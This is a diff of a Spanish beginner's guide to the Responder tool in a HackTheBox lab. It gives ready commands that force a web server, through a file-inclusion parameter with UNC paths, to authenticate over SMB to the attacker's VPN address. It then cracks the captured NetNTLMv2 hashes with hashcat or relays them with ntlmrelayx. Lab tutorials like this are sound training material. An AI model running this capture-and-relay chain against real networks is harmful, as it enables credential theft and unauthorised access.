@@ -1,19 +1,22 @@
 ---
-title: "Responder — Guía sencilla (para DUMMIES)"
-description: "Responder — Guía sencilla (para DUMMIES)"
-category: "Imported Documentation"
+title: 'Responder — Guía sencilla (para DUMMIES)'
+description: 'Responder — Guía sencilla (para DUMMIES)'
+category: 'Imported Documentation'
 tags:
   - documentation
   - notebook
   - responder-simple
 ---
+
 Responder — Guía sencilla (para DUMMIES)
 
 ¿Para qué sirve?
+
 - Responder captura autenticaciones NTLM que ocurren en la red cuando Windows intenta acceder a recursos compartidos (SMB) o responder a búsquedas locales (LLMNR/NetBIOS).
 - Útil para capturar NetNTLMv2 o para usar esas autenticaciones en RELAY (reenviar) a otros servicios.
 
 Conceptos clave muy simples
+
 - VPN (`tun0`): es la interfaz que te da HTB. Tu IP ahí es la que el objetivo debe alcanzar.
 - UNC/SMB: ruta tipo `\\IP\Share`. Si el servidor intenta abrirla, hace NTLM hacia `IP`.
 - Captura vs Relay:
@@ -21,40 +24,55 @@ Conceptos clave muy simples
   - Relay: sin romper nada, reenvías la autenticación a otro servicio que acepte NTLM y obtienes acceso.
 
 Pasos recomendados (comandos listos)
-1) Ver tu IP en la VPN:
+
+1. Ver tu IP en la VPN:
+
 ```bash
 ip a | grep tun0
 ```
-2) Iniciar Responder en la interfaz adecuada:
+
+2. Iniciar Responder en la interfaz adecuada:
+
 ```bash
 sudo responder -I tun0 -wrf
 ```
-3) Forzar al servidor a conectar a tu IP usando la web (prueba variantes):
+
+3. Forzar al servidor a conectar a tu IP usando la web (prueba variantes):
+
 ```bash
 curl -s -H "Host: unika.htb" "http://10.129.95.234/index.php?page=//10.10.17.188/Share"
 curl -s -H "Host: unika.htb" "http://10.129.95.234/index.php?page=\\10.10.17.188\\Share"
 curl -s -H "Host: unika.htb" "http://10.129.95.234/index.php?page=\\\\10.10.17.188\\\\Share"
 ```
-4) Mirar el logfile en vivo:
+
+4. Mirar el logfile en vivo:
+
 ```bash
 tail -f Logs/Responder-*/Responder-Session.log
 ```
-5) Si hay hash, opciones:
+
+5. Si hay hash, opciones:
+
 - Crack (lentísimo):
+
 ```bash
 hashcat -m 5600 netntlm_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
+
 - Relay (habitual):
+
 ```bash
 sudo ntlmrelayx.py -t smb://10.129.95.234 -smb2support
 ```
 
 Errores comunes y por qué no ves nada
+
 - El servidor no puede alcanzar tu `tun0` IP → no hay conexión → no hay hash.
 - La aplicación no provoca una conexión SMB por cómo procesa `page` → prueba variantes o vectores distintos.
 - Firewalls o reglas IPS bloquean tráfico SMB entre el objetivo y tu IP.
 
 Resumen para recordar
+
 - `tun0` = tu IP dentro de HTB.
 - `-I tun0` = escucha ahí.
 - UNC trigger = provocar que el servidor haga SMB hacia ti.
